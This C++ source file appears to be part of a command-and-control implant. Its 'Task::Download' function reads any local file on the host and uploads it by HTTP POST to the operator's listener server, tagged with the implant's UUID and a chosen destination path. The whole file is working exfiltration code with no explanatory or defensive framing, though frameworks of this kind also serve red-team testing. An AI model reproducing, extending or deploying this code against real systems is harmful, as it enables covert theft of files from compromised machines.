#include "core/task.hpp"

namespace Task
{
    std::wstring Download(State::StateManager& sm, const std::wstring& wSrc, const std::wstring& wDest)
    {
        std::wstring wHeaders;
        System::Http::WinHttpResponse resp;

        // Read a local file.
        std::vector<char> byteData = System::Fs::ReadBytesFromFile(wSrc);

        // Set additional headers.
        // Specify the destination file path in the server-side.
        wHeaders = L"X-UUID: " + sm.GetUUID() + L"\r\n" +  L"X-FILE: " + wDest + L"\r\n";

        resp = System::Http::SendRequest(
            sm.GetHConnect(),
            sm.GetListenerHost(),
            sm.GetListenerPort(),
            sm.GetReqPathUpload(),
            L"POST",
            wHeaders.c_str(),
            (LPVOID)byteData.data(),
            (DWORD)byteData.size()
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return L"Error: Could not upload a file.";
        }

        return wDest.c_str();
    }
}